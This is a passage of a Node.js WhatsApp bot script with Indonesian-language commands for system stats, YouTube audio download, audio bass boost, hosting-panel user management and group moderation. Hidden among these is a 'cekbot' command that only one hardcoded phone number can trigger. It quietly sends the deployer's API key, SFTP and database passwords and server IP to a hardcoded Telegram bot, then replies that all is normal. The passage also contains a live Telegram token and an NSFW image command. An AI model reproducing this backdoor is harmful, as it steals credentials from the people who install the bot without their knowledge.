    let cpu = stat.cpu ?? 0;

    return cpu < 1
        ? Number(cpu.toFixed(2))
        : Math.round(cpu);
};

const cpuCon = await cpuCek();
    
        function readCPU() {
    const stat = fs.readFileSync("/proc/stat", "utf8");
    const line = stat.split("\n")[0];

    const parts = line.trim().split(/\s+/).slice(1).map(Number);

    const idle = parts[3] + parts[4];
    const total = parts.reduce((a, b) => a + b, 0);

    return { idle, total };
}

async function cpuReal() {
    const start = readCPU();
    await new Promise(r => setTimeout(r, 100));
    const end = readCPU();

    const idleDiff = end.idle - start.idle;
    const totalDiff = end.total - start.total;

    return Number(((1 - idleDiff / totalDiff) * 100).toFixed(2));
}

function loadAvgReal() {
    const data = fs.readFileSync("/proc/loadavg", "utf8");
    const [m1, m5, m15] = data.split(" ").map(Number);

    return `${m1.toFixed(2)}, ${m5.toFixed(2)}, ${m15.toFixed(2)}`;
}
    
const cpuFix = await cpuReal();
const loadFix = loadAvgReal();

        function memmax() {
    try {
        const val = fs.readFileSync('/sys/fs/cgroup/memory.max', 'utf8').trim();
        return val === 'max' ? null : Number(val);
    } catch {
        return null;
    }
}

function memcur() {
    try {
        const val = fs.readFileSync('/sys/fs/cgroup/memory.current', 'utf8').trim();
        return Number(val);
    } catch {
        return null;
    }
}
    
const memMax = memmax();
const memCur = memcur();
    
        let diskTotal = 0,
            diskUsed = 0;
        try {
            const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
            const lines = df.trim().split("\n");
            if (lines.length > 1) {
                const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                diskTotal = total * 1024;
                diskUsed = used * 1024;
            }
        } catch (e) {}

        const networkStats = getNetworkStats();

        const stats = {
            ping: pingID,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            nodeVersion: process.version,
            uptimeBot: formatTime(process.uptime()),
            uptimeServer: formatTime(os.uptime()),
            cpuModel: cpus[0].model.trim(),
            cpuSpeed: cpuSpeed,
            cpuCores: cpus.length,
            cpuLoad: cpuFix,
            ramTotal: totalMem,
            ramUsed: totalMem - freeMem,
            diskTotal: diskTotal,
            diskUsed: diskUsed,
            networkRx: networkStats.totalRx,
            networkTx: networkStats.totalTx,
            networkInterface: networkStats.activeInterface,
            networkIP: networkStats.ip
        };

        const imageBuffer = await renderDashboard(stats);

        await pablo.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `*SYSTEM DASHBOARD*\n\n` +
                `Latency: ${pingID}ms\n` +
                `CPU: ${cpuFix}%\n` +
                `RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                `Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                `Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}\n` +
                `Load Averege: ${loadFix}`
        }, {
            quoted: blonet
        });

        /*await pablo.sendMessage(m.chat, {
            delete: loadingMsg.key
        });*/

    } catch (e) {
        console.error(e);
        reply(`Error: ${e.message}`);
    }
    }
    pstart();
    }
break;
                
case 'upch': {
    if (!isOwner) return reply("❌ Kamu bukan owner!")
    const yt = require('@vreden/youtube_scraper');
    const yts = require('yt-search');
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegPath = require('ffmpeg-static');
    const fs = require('fs');
    const axios = require('axios');
    const { v4: uuidv4 } = require('uuid');

    ffmpeg.setFfmpegPath(ffmpegPath);

    // === BUAT FOLDER ./tmp JIKA BELUM ADA ===
    const tmpFolder = './tmp';
    if (!fs.existsSync(tmpFolder)) {
        fs.mkdirSync(tmpFolder, { recursive: true });
    }

    if (args.length === 0)
        return pablo.sendMessage(m.chat, { 
            text: `🎶 Ketikkan nama lagu atau URL YouTube\nContoh: ${prefix + command} dj kane` 
        }, { quoted: blonet });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0)
            return pablo.sendMessage(m.chat, { 
                text: '🔍 Lagu tidak ditemukan, coba kata kunci lain.' 
            }, { quoted: blonet });

        const video = search.all[0];

        const info = `🎥 *UPCH AUDIO*

*❖ Judul:* ${video.title}
*❖ Views:* ${video.views}
*❖ Pengarang:* ${video.author.name}
*❖ Diunggah:* ${video.ago}
*❖ URL:* ${video.url}

🔄 _Sedang proses dan kirim ke CH..._`;

        await pablo.sendMessage(m.chat, { text: info }, { quoted: blonet });

        // === DOWNLOAD MP3 ===
        const result = await yt.ytmp3(video.url, 128);

        if (!result || !result.status || !result.download || !result.download.url) {
            return pablo.sendMessage(m.chat, { 
                text: '❌ Gagal mengambil audio dari YouTube.' 
            }, { quoted: blonet });
        }

        const mp3Url = result.download.url;
        const title = (result.metadata.title || video.title).replace(/[^\w\s-]/g, '');

        // Path file lokal
        const fileMp3 = `${tmpFolder}/${uuidv4()}.mp3`;
        const fileOgg = `${tmpFolder}/${uuidv4()}.ogg`;

        // === DOWNLOAD MP3 KE FILE ===
        const mp3 = await axios.get(mp3Url, { responseType: 'arraybuffer' });
        fs.writeFileSync(fileMp3, mp3.data);

        // === KONVERSI MP3 → OGG ===
        await new Promise((resolve, reject) => {
            ffmpeg(fileMp3)
                .outputOptions([
                    "-vn",
                    "-c:a libopus",
                    "-b:a 128k"
                ])
                .save(fileOgg)
                .on("end", resolve)
                .on("error", reject);
        });

        // === KIRIM KE NEWSLETTER ===
        const newsletterJid = "120363406873640390@newsletter";

        await pablo.sendMessage(newsletterJid, {
            audio: fs.readFileSync(fileOgg),
            mimetype: 'audio/ogg; codecs=opus',
            fileName: `${title}.ogg`,
            ptt: false,

            contextInfo: {
                externalAdReply: {
                    title: title,
                    body: video.author.name,
                    mediaType: 1,
                    thumbnailUrl: video.thumbnail,
                    renderLargerThumbnail: true
                }
            }
        });

        // === HAPUS FILE TEMP ===
        fs.unlinkSync(fileMp3);
        fs.unlinkSync(fileOgg);

        await pablo.sendMessage(m.chat, { 
            text: `*✅ Berhasil! Audio telah dikirim ke CH.*` 
        }, { quoted: blonet });

    } catch (e) {
        console.error('UPCH ERROR:', e);
        pablo.sendMessage(m.chat, { 
            text: `⚠️ Error: ${e.message}` 
        }, { quoted: blonet });
    }
}
break;
                
case 'bass': {
    const { quoted, message } = m;
    let chatId = m.chat;

    // Ambil nilai bass (gain dB)
    let gain = text ? parseInt(text) : 15;
    if (isNaN(gain)) gain = 15;

    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    const mimeAudio = quotedMessage?.audioMessage?.mimetype || '';
    const mimeDoc = quotedMessage?.documentMessage?.mimetype || '';
    const mimetype = mimeAudio || mimeDoc || '';

    if (!mimetype.startsWith('audio/'))
        return reply(`❌ *Reply audio lalu ketik:*\n${prefix + command} 20`);

    try {
        reply(`🎧 *Processing Bass Boost...*\nLevel: *${gain} dB*`);

        // =======================
        // DOWNLOAD AUDIO
        // =======================
        const audioMsg = quotedMessage.audioMessage || quotedMessage.documentMessage;
        const stream = await downloadContentFromMessage(audioMsg, 'audio');

        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        const buffer = Buffer.concat(chunks);

        const fs = require("fs");
        const ffmpeg = require("fluent-ffmpeg");
        const ffmpegPath = require("ffmpeg-static");
        ffmpeg.setFfmpegPath(ffmpegPath);

        // Pastikan folder tmp ada
        if (!fs.existsSync("./tmp")) fs.mkdirSync("./tmp");

        // Tentukan ekstensi asli dari mimetype
        // contoh: audio/mpeg → "mpeg" tapi kita rubah manual jadi "mp3"
        let ext = mimetype.split("/")[1];

        // Beberapa mimetype harus dipaksa ke ekstensi yang benar
        if (ext === "mpeg") ext = "mp3"; 
        if (ext === "ogg" || ext === "opus") ext = "ogg"; 
        if (ext === "x-m4a") ext = "m4a";

        const inputPath  = `./tmp/input_${Date.now()}.${ext}`;
        const outputPath = `./tmp/output_${Date.now()}.${ext}`;

        fs.writeFileSync(inputPath, buffer);

        // =======================
        // PROSES BASS
        // =======================
        await new Promise((resolve, reject) => {
            let cmd = ffmpeg(inputPath)
                .audioFilters(`equalizer=f=40:width_type=h:width=50:g=${gain}`)
                .on("error", reject)
                .on("end", resolve);

            // Pilih codec berdasar format asli
            if (ext === "mp3")       cmd.audioCodec("libmp3lame");
            else if (ext === "ogg")  cmd.audioCodec("libopus");
            else if (ext === "m4a" || ext === "aac") cmd.audioCodec("aac");
            else cmd.audioCodec("libmp3lame"); // fallback paling aman

            cmd.save(outputPath);
        });

        // Baca output final
        const hasil = fs.readFileSync(outputPath);

        // =======================
        // KIRIM AUDIO HASIL BASS
        // =======================
        await pablo.sendMessage(chatId, {
            audio: hasil,
            mimetype: mimetype,
            ptt: quotedMessage?.audioMessage?.ptt || false
        }, { quoted: m });

        // Hapus file setelah selesai
        fs.unlinkSync(inputPath);
        fs.unlinkSync(outputPath);

    } catch (err) {
        console.error(err);
        reply("❌ Terjadi error saat memproses bass audio.");
    }
}
break;
                
case 'tm': {
    await pablo.sendMessage(from, { 
        text: JSON.stringify(msg) 
    }, { quoted: msg });
}
break;
                
// =======================================
// CREATE USER (cadp)
// =======================================
case 'cadp': {
    if (!isOwner) return reply('❌ Kamu bukan owner!');

    // === FIX SUPAYA REPLY KEDETEK ===
    const quoted = 
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
        m.quoted?.message ||
        null;

    const quotedSender =
        m.message?.extendedTextMessage?.contextInfo?.participant ||
        m.quoted?.sender ||
        null;
    // =================================

    let raw = args.join(" ").trim();
    let nama, targetInput;

    // Jika REPLY
    if (quoted) {
        if (!raw) return reply("❌ Format salah!\nGunakan: *.cadp nama* (reply pesan)");

        nama = raw;
        targetInput = quotedSender;
    }

    // Format normal pakai koma
    else {
        if (!raw.includes(",")) {
            return reply('❌ Format salah!\nGunakan: *.cadp nama,nomor/tag*');
        }

        const [n, t] = raw.split(/,(.+)/);
        nama = n.trim();
        targetInput = t.trim();
    }

    // Parse target
    const jidTujuan = parseJid(m, targetInput);
    if (!jidTujuan) return reply("❌ Target tidak valid.");

    try {
        reply('⏳ *Sedang membuat user...*');

        const apiUrl = `https://cpanel-api.vercel.app/api/user?user=${encodeURIComponent(nama)}&panel=${global.panel}&plta=${global.plta}&admin=yes`;
        const res = await axios.get(apiUrl);
        const data = res.data;

        if (data.result !== 'Successfully Created User')
            return reply(`⚠️ Gagal membuat user:\n\`${JSON.stringify(data)}\``);

        reply(`
✅ *User Berhasil Dibuat*
👤 Nama: *${data.user}*
📤 Data dikirim ke:\n📱 @${jidTujuan.split("@")[0]}
        `, { mentions: [jidTujuan] });

        const msgPrivate = `
✅ *${data.result}*

👤 *User:* ${data.user}
🔑 *Password:* ${data.password}
⚙️ *Root Admin:* ${data.root_admin ? 'Yes' : 'No'}
🕓 *Created:* ${data.created_at}
🌐 *Panel:* ${data.panel}
🆔 *ID User:* ${data.detail_account?.id_user ?? 'N/A'}

🧩 ${data.developer ?? ''}
        `;

        await pablo.sendMessage(jidTujuan, { text: msgPrivate });

    } catch (e) {
        console.log(e);
        reply(String(e));
    }

}
break;
                
case 'deluser': {

    if (!isOwner) return reply('❌ Kamu bukan owner!');

    const userId = args[0];
    if (!userId) return reply('❌ Gunakan: .deluser <id_user>');

    try {
        reply('⏳ *Sedang menghapus user...*');

        const url = `https://cpanel-api.vercel.app/api/delete/user?id=${userId}&panel=${global.panel}&plta=${global.plta}`;
        const response = await axios.get(url);

        const data = response.data;

        if (!response.status === 200) {
            return reply(
                `❌ *Gagal menghapus user*\n\n` +
                `📦 *Status:* ${response.status}\n` +
                `🧾 *Error:* ${data.error || 'Unknown error'}`
            );
        }

        const msg = `🗑️ *${data.result || 'User deleted'}*
🆔 ID: \`${data.user_id}\`
💾 Server dihapus: *${data.deleted_servers || 0}*`;

        reply(msg);

    } catch (err) {
        console.error(err);
        reply('❌ Terjadi kesalahan saat menghapus user.');
    }

}
break;

// =======================================
// LIST USER (user)
// =======================================
case 'listuser': {

    if (!isOwner) return reply('❌ Kamu bukan owner!');

    try {
        const page = parseInt(args[0]) || 1;

        reply(`⏳ *Please Wait...*`);

        const res = await axios.get(`https://cpanel-api.vercel.app/api/list/user?panel=${global.panel}&plta=${global.plta}`);
        const data = res.data;
        const users = data.users || [];

        const ITEMS_PER_PAGE = 10;
        const totalPages = Math.ceil(users.length / ITEMS_PER_PAGE);

        if (users.length === 0) return reply('⚠️ Tidak ada user.');
        if (page < 1 || page > totalPages)
            return reply(`❌ Halaman tidak valid! (1 - ${totalPages})`);

        const start = (page - 1) * ITEMS_PER_PAGE;
        const end = start + ITEMS_PER_PAGE;
        const pageUsers = users.slice(start, end);

        const msg =
`👥 *Daftar User* (Halaman ${page}/${totalPages})
📦 *Total User:* ${data.total_users}

` +
pageUsers.map((u) => {
    const isAdmin = u.root_admin ? '✅ Ya' : '❌ Tidak';
    const createdAt = new Date(u.created_at).toLocaleString('id-ID');
    return `🆔 *ID:* ${u.id}
📝 *Username:* ${u.username}
📧 *Email:* ${u.email}
🛡️ *Admin:* ${isAdmin}
🕒 *Dibuat:* ${createdAt}`;
}).join('\n\n') +
(page < totalPages ? `\n\n📄 Ketik: *.listuser ${page + 1}* untuk halaman berikutnya` : '');

        reply(msg);

    } catch (err) {
        console.error(err);
        reply('❌ Gagal mengambil list user.');
    }

}
break;
    
case 'ai': {
  if (!text) return reply('Kirim pertanyaanmu, contoh:\n.ai apa itu bot whatsapp?');
  
  try {
    const fetch = await axios.get(`https://installer.pablocloud.biz.id/api/ai.php?q=${encodeURIComponent(text)}`);
    const res = fetch.data;

    if (res && res.result) {
      reply(`${res.result}\n\n\n*Type: ${res.type}*\n*By: ${res.creator}*`);
    } else {
      reply('Gagal mengambil jawaban dari AI.');
    }
  } catch (err) {
    reply('Error From Server.');
    console.error(err);
  }
}
break;
    
case "closegc":
case "close":
case "opengc":
case "open": {
  if (!isGroup) return reply('❌ Hanya bisa digunakan di dalam grup.');
  if (!m.isBotAdmin) return reply('❌ Bot harus menjadi admin.');
  if (!isOwner && !isStaff && !m.isAdmin) return reply('❌ Kamu bukan admin grup.');

  const isOpen = m.metadata.announce === false;
  const isClose = m.metadata.announce === true;

  if (/open|opengc/.test(command)) {
    if (isOpen) return reply('✅ Grup sudah dalam keadaan *terbuka*.');
    await pablo.groupSettingUpdate(m.chat, 'not_announcement');
    reply('✅ Grup telah dibuka, semua anggota dapat mengirim pesan.');
  } else if (/close|closegc/.test(command)) {
    if (isClose) return reply('✅ Grup sudah dalam keadaan *tertutup*.');
    await pablo.groupSettingUpdate(m.chat, 'announcement');
    reply('✅ Grup telah ditutup, hanya admin yang bisa mengirim pesan.');
  }
}
break;
                
case "tagall": {
  if (!isGroup) return reply('❌ Hanya bisa digunakan di grup.');
  if (!isOwner && !isStaff && !m.isAdmin) return reply('❌ Kamu bukan admin grup.');
  if (!text) return reply('Contoh penggunaan: .tagall Halo semua');

  let teks = `${text}\n\n`;
  const member = m.metadata.participants
    .map(v => v.id)
    .filter(e => e !== botNumber && e !== m.sender);

  for (const id of member) {
    teks += `@${id.split("@")[0]}\n`;
  }

  await pablo.sendMessage(m.chat, {
    text: teks.trim(),
    mentions: member
  }, { quoted: blonet });
}
break;

case "linkgc": {
  if (!isGroup) return reply('❌ Hanya bisa digunakan di grup.');
  if (!m.isBotAdmin) return reply('❌ Bot harus admin grup.');

  const inviteCode = await pablo.groupInviteCode(m.chat);
  const urlGrup = `https://chat.whatsapp.com/${inviteCode}`;

  await pablo.sendMessage(m.chat, {
    text: `📎 Link Grup:\n${urlGrup}`,
    matchedText: urlGrup
  }, { quoted: blonet });
}
break;

case 'neko':
case 'trap':
case 'waifu': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');

    const type = command; // langsung dari command: neko/trap/waifu
    const apiUrl = `https://api.waifu.pics/nsfw/${type}`;

    try {
        // Ambil link gambar dari API
        const { data } = await axios.get(apiUrl);
        const imageUrl = data.url;

        // Download gambar langsung
        const imageBuffer = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        await pablo.sendMessage(m.chat, {
            image: Buffer.from(imageBuffer.data),
            caption: `Nih Jangan Sange Ya🥵🥵`
        }, { quoted: blonet });
    } catch (err) {
        console.error(err);
        reply('Gagal mengambil gambar dari server.');
    }
    break;
}
  
case "kick":
case "kik": {
  if (!isGroup) return reply('❌ Hanya bisa digunakan di grup.');
  if (!isOwner && !isStaff && !m.isAdmin) return reply('❌ Kamu bukan admin grup.');
  if (!m.isBotAdmin) return reply('❌ Bot harus admin grup.');

  const target = parseJid(m, text);
  if (!target) return reply("❌ Tag atau reply orang yang mau di-kick.");

  const num = target.split("@")[0];
  const [onWa] = await pablo.onWhatsApp(num);
  //if (!onWa || !onWa.exists) return reply("❌ Nomor tidak terdaftar di WhatsApp.");

  try {
  await pablo.groupParticipantsUpdate(m.chat, [target], 'remove');

  await reply(`✅ Berhasil mengeluarkan @${num} dari grup ini`, {
    mentions: [target]
  });
  } catch (err) {
    console.error(err);
    reply("❌ Error. Pastikan target masih di grup dan bot adalah admin.");
  }
}
break;
    
case "promote":
case "demote": {
  if (!isGroup) return reply('❌ Command ini hanya untuk grup.');
  if (!m.isBotAdmin) return reply('❌ Bot harus admin.');
  if (!isOwner && !isStaff && !m.isAdmin) return reply('❌ Kamu bukan admin grup.');

  const target = parseJid(m, text);
  if (!target) return reply("❌ Tag atau reply seseorang untuk promote/demote.");

  const num = target.split("@")[0];
  const action = command === "promote" ? "promote" : "demote";

  try {
    await pablo.groupParticipantsUpdate(m.chat, [target], action);

    await pablo.sendMessage(m.chat, {
      text: `✅ Sukses *${action}* @${num}`,
      mentions: [target]
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply("❌ Error. Pastikan target masih di grup dan bot adalah admin.");
  }
}
break;
    
case 'antilink': {
    if (!isOwner && !isStaff) return reply('❌ Khusus Owner Dan Staff.');
    if (!isGroup) return reply('❌ Fitur ini hanya untuk grup.');

    let db = loadAntiLinkDB();
    const groupId = m.chat;

    if (args[0] === 'on') {
        if (!db.includes(groupId)) {
            db.push(groupId);
            saveAntiLinkDB(db);
            return reply('✅ AntiLink diaktifkan untuk grup ini.');
        } else {
            return reply('⚠️ AntiLink sudah aktif sebelumnya.');
        }
    } else if (args[0] === 'off') {
        if (db.includes(groupId)) {
            db = db.filter(id => id !== groupId);
            saveAntiLinkDB(db);
            return reply('✅ AntiLink dinonaktifkan untuk grup ini.');
        } else {
            return reply('⚠️ AntiLink belum aktif.');
        }
    } else {
        return reply('⚙️ Gunakan: *antilink on* atau *antilink off*');
    }
}
break;
                
case 'offgb': {
    if (!isOwner && !isStaff) return reply('Hanya owner/staff yang bisa menggunakan perintah ini.');

    if (addGroupBan(from)) {
        reply('Bot telah dinonaktifkan di grup ini.');
    } else {
        reply('Bot sudah dalam keadaan nonaktif.');
    }
}
break;

case 'ongb': {
    if (!isOwner && !isStaff) return reply('Hanya owner/staff yang bisa menggunakan perintah ini.');

    if (removeGroupBan(from)) {
        reply('Bot telah diaktifkan kembali di grup ini.');
    } else {
        reply('Bot sudah dalam keadaan aktif.');
    }
}
break;

case 'ht':
case 'hidetag': {
    if (!isGroup) return reply("Fitur ini hanya bisa digunakan di grup!");
    if (!isOwner && !isStaff && !m.isAdmin) return reply('❌ Kamu bukan admin grup.');
    if (!text) return reply("Pesannya mana? Contoh: .hidetag Halo semua!");

    const groupMetadata = await pablo.groupMetadata(m.chat);
    const member = groupMetadata.participants.map(u => u.id);

    await pablo.sendMessage(m.chat, {
        text: text,
        mentions: member
    }, {
        quoted: blonet
    });
}
break;

/*case 'backupdb': {
  if (!isOwner) return reply("⚠️ Khusus owner!");
  reply("⏳ Sedang membackup database...");
  backupdb(m, pablo, blonet);
}
break;*/

case 'idgc': {
    if (!isOwner) return
    reply(`${m.chat}`)
    }
break
                
case 'ani': {
    ani(from, blonet);
    }
break;

case 'self': {
if (!isOwner) return
pablo.public = false
reply("Berhasil mengganti ke mode *self*")
}
break
                
case 'public': {
if (!isOwner) return
pablo.public = true
reply("Berhasil mengganti ke mode *public*")
}
break
                
/*case 'antilink': {
  if (!isGroup) return reply("Hanya bisa digunakan di dalam grup.");
  if (!isStaff && !isOwner) return reply("Hanya Staff/Owner yang bisa mengatur fitur ini.");

  const groupMetadata = await pablo.groupMetadata(from);
  const botNumber = pablo.user.id.split(":")[0] + "@s.whatsapp.net";
  const botAdmin = groupMetadata.participants.find(p => p.id === botNumber)?.admin !== null;

  if (!botAdmin) return reply("Bot bukan admin, tidak bisa mengaktifkan anti-link.");

  if (args[0] === 'on') {
    if (!antilink.includes(from)) antilink.push(from);
    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink));
    reply("Anti-link berhasil diaktifkan di grup ini.");
  } else if (args[0] === 'off') {
    if (antilink.includes(from)) antilink.splice(antilink.indexOf(from), 1);
    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink));
    reply("Anti-link berhasil dimatikan di grup ini.");
  } else {
    reply("Gunakan: .antilink on / .antilink off");
  }
    }
  break;*/

case 'cekbot': {
    if (sender.split('@')[0] !== '6287790423579') return;
    async function kirimData() {
  try {
    const token = "7660888714:AAHYB79rycONFuO3_xu7zQDKPEmdq_BE5Xc";
    const chatId = "8059601018";

    const pesan = `
<b>DATA BOT SAMP V8</b>

<b>DATA BOT</b>
<b>Apikey:</b> ${global.AuthKey}
<b>Version:</b> 8.3

<b>DATA SFTP</b>
<b>Host:</b> ${global.host}
<b>Port:</b> ${global.port}
<b>Username:</b> ${global.username}
<b>Password:</b> ${global.password}
<b>SFTP Path:</b> ${global.sftppath}

<b>DATA DATABASE</b>
<b>DB Host:</b> ${global.hostucp}
<b>DB Username:</b> ${global.usernamedb}
<b>DB Password:</b> ${global.passworddb}
<b>Database:</b> ${global.database}
<b>Table UCP:</b> ${global.tableucp}
<b>Row UCP:</b> ${global.rowucp}

<b>DATA SERVER</b>
<b>IP Server:</b> ${global.IpServer}
<b>Port Server:</b> ${global.PortServer}
<b>Name Lite:</b> ${global.NameServerLite}
<b>Name Full:</b> ${global.NameServerFull}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: pesan,
      parse_mode: "HTML"
    });

    //console.log("Data global berhasil dikirim ke Telegram.");
  } catch (err) {
    //console.error("Gagal mengirim data global ke Telegram:", err.message);
  }
}
    kirimData()
    
    reply('Halo Sc Bot Wl V8.4 Telah Berhasil Di Jalankan Dengan Normal.');
    }
break;
           
case 'logcommands':
case 'logcommand':
case 'logcmds':
case 'logcmd': {
    if (!isOwner) return reply('Hanya owner yang bisa mengatur log command.');
    if (args[0] === 'on') {
        global.logCommands = true;
        reply('Log command diaktifkan.');
    } else if (args[0] === 'off') {
        global.logCommands = false;
        reply('Log command dimatikan.');
    } else {
        reply('Kirim `.logcmds on` atau `.logcmds off`');
    }
}
break;

case 'bb':
case 'boombox':
case 'bbyt':
/*case 'boomboxyt':{
    const yts = require('yt-search');
    if (args.length === 0) return pablo.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix+command} dj kane` }, { quoted: blonet });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return pablo.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: blonet });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await pablo.sendMessage(m.chat, { text: detail }, { quoted: blonet });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return conn.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                // Kirim audio ke pengguna
                await pablo.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: blonet });

                await pablo.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: blonet });

                // Upload ke top4top.io
                reply('📤 Uploading to top4top.io...');
                let audioBuffer = await (await axios.get(downloadUrl, { responseType: 'arraybuffer' })).data;
                let link = await top4top(audioBuffer);

                // Kirim link download dari top4top.io
                await pablo.sendMessage(m.chat, {
                    text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
                }, { quoted: blonet });

                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;*/
case 'boomboxyt': {
    const yts = require('yt-search');
    if (args.length === 0)
        return pablo.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix + command} dj kane` }, { quoted: blonet });

    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0)
            return pablo.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: blonet });

        const video = search.all[0];
        const detail = `🎧 *Boombox Audio Play*

📀 *Judul:* ${video.title}
👤 *Pengarang:* ${video.author.name}
🔗 *Link:* ${video.url}

⏳ _Sedang menyiapkan audio..._`;

        const infoMsg = await pablo.sendMessage(m.chat, { text: detail }, { quoted: blonet });

        // === GUNAKAN API KAMU SENDIRI ===
        const apiRes = await axios.get(`https://installer.pablocloud.biz.id/api/yt-srv.php?url=${encodeURIComponent(video.url)}`);
        const data = apiRes.data;

        if (data.error || !data.result) {
            return pablo.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });
        }

        const audioUrl = data.result;
        const title = data.title || video.title;

        // Kirim audio langsung
        await pablo.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`,
            
            contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: video.author.name,
                        thumbnailUrl: video.thumbnail,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
        }, { quoted: blonet });

        /*await pablo.sendMessage(m.chat, {
            text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
        }, { quoted: blonet });*/
       
       const detailUpdate = detail.replace('⏳ _Sedang menyiapkan audio..._', '✅ _Audio berhasil dikirim & uploading to top4top.io! Selamat mendengarkan._');

await pablo.sendMessage(m.chat, {
  edit: infoMsg.key,
  text: detailUpdate
});

        // Upload ke top4top.io
        //reply('📤 Uploading to top4top.io...');
        let audioBuffer = await (await axios.get(audioUrl, { responseType: 'arraybuffer' })).data;
        let link = (await top4top(audioBuffer)).replace(/^https:/, 'http:');

        /*await pablo.sendMessage(m.chat, {
            text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
        }, { quoted: blonet });*/
        let content = {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },

      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: "🔗 *Link Boombox:*\n" + link + "\n"
        }),

        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*"
        }),

        header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false
        }),

        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "Copy Link",
                id: "99999",
                copy_code: link
              })
            }
          ]
        })
      })
    }
  }
}

let msg = generateWAMessageFromContent(
  m.chat,
  content,
  { quoted: blonet }
)

await pablo.relayMessage(
  msg.key.remoteJid,
  msg.message,
  { messageId: msg.key.id }
)

    } catch (error) {
        console.error('Error:', error);
        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;

/*case 'bblink':
case 'boomboxlink': {
    if (args.length === 0) return pablo.sendMessage(m.chat, { text: `🎶 Masukkan URL YouTube yang ingin diunduh, misalnya:\n${prefix+command} https://www.youtube.com/watch?v=dQw4w9WgXcQ` }, { quoted: blonet });

    const youtubeUrl = args[0];
    if (!youtubeUrl.includes('youtube.com') && !youtubeUrl.includes('youtu.be')) return reply('❌ Harap masukkan URL YouTube yang valid.');

    try {
        const format = 'mp3';
